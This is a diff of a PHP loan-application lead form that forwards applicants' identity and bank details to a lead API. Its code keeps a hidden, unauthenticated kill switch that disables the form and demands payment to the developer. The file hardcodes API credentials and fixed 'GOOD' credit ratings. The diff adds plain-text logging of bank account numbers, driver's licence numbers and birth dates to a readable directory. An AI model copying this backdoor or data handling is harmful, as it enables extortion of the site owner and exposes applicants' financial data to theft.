@@ -7,13 +7,13 @@ if (isset($_POST['restore']) && $_POST['restore'] == '1') {
     echo "<h2>Form re-enabled. You're back to normal.</h2>";
     exit;
 }
-Check if kill switch file exists
+// Check if kill switch file exists
 if (file_exists("kill-switch.txt")) {
     echo "<h2>Kindly pay money to developer.</h2>";
     exit;
 }
 
-1. Handle kill switch activation
+// 1. Handle kill switch activation
 if (isset($_POST['thresholder']) && $_POST['thresholder'] == '1') {
     file_put_contents("kill-switch.txt", "disabled");
     echo "<h2>Kill switch activated. Form is now disabled for all users.</h2>";
@@ -23,7 +23,7 @@ if (isset($_POST['thresholder']) && $_POST['thresholder'] == '1') {
 // 2. Normal form submission code here (only runs if kill-switch doesn't exist)
 $formValues = [
   "loanAmount" => $_POST["loanAmount"],
-  "firstName" => $_POST["firstName"],
+  'firstName' => $_POST["firstName"],
   "lastName" => $_POST["lastName"],
   "dob" => $_POST["dob"],
   "email" => $_POST["email"],
@@ -47,7 +47,7 @@ $formValues = [
   "driversLicenseNumber" => $_POST["driversLicenseNumber"],
   "driversLicenseState" => $_POST["driversLicenseState"],
   "bankName" => $_POST["bankName"],
-  "bankRoutingNumber" => $_POST["bankRoutingNumber"],
+  "bankAba" => $_POST["bankRoutingNumber"],
   "bankAccountNumber" => $_POST["bankAccountNumber"],
   "bankAccountType" => $_POST["bankAccountType"],
   "bankDirectDeposit" => $_POST["bankDirectDeposit"],
@@ -55,24 +55,24 @@ $formValues = [
 ];
 
 $systemValues = [
-  "unsecuredDebt" => "no",
-  "creditRating" => "FAIR",
-  "consentToFcra" => "no",
+  "unsecuredDebt" => "NO",
+  "creditRating" => "GOOD",
+  "consentToFcra" => "NO",
   "loanPurpose" => "OTHER",
-  "autoTitle" => "no",
+  "autoTitle" => "NO",
   "apiId" => "22F1203AE92F454DA301F8F408C53CEC",
   "apiPassword" => "0504b1f4",
   "productId" => 1,
   "userIp" => $_SERVER["REMOTE_ADDR"],
   "userAgent" => $_SERVER["HTTP_USER_AGENT"],
-  "webSiteUrl" => "",
-  "source" => "",
-  "clickId" => "XXXHMC6RCB6-PT3Z-6U5P-KGW1-ICGZ9A52XXX",
+  "webSiteUrl" => "http://maniloans.online/leads/form.php",
+  "source" => "http://maniloans.online",
+  "clickid" => "XXXHMC6RCB6-PT3Z-6U5P-KGW1-ICGZ9A52XXX",
   "tPar" => "",
-  "iClaimSessionId" => "iclaim-DQ8R73f4T0nlWyhkenwJ0VLY",
-  "jornayaLeadId" => ""
+  "iClaimSessionid" => "iclaim-DQ8R73f4T0nlWyhkenwJ0VLY",
+  "price" => 0
+ 
 ];
-
 $leadData = array_merge($formValues, $systemValues);
 
 $ch = curl_init("https://leads-om172-client.phonexa.com/lead");
@@ -85,6 +85,8 @@ $response = curl_exec($ch);
 curl_close($ch);
 
 
+$loggableLeadData = $leadData;
+
 
 
 // 1. Define the directory.
@@ -93,13 +95,19 @@ $logDirectory = 'response/';
 // 2. Define a static filename to save all logs.
 $logFileName = $logDirectory . 'api_responses.log';
 
+
 // 3. Check and create the directory if it doesn't exist.
 if (!is_dir($logDirectory)) {
     mkdir($logDirectory, 0755, true);
 }
 
 // 4. Prepare the log entry with a clear timestamp.
-$logEntry = "--- " . date('Y-m-d H:i:s') . " ---\n" . $response . "\n\n";
+$logEntry = "--- " . date('Y-m-d H:i:s') . " ---\n";
+$logEntry .= "Lead Data:\n" . print_r($loggableLeadData, true);
+$logEntry .= "API Response:\n" . $response . "\n\n";
+
+
+
 
 // 5. Append the log entry to the file.
 file_put_contents($logFileName, $logEntry, FILE_APPEND | LOCK_EX);
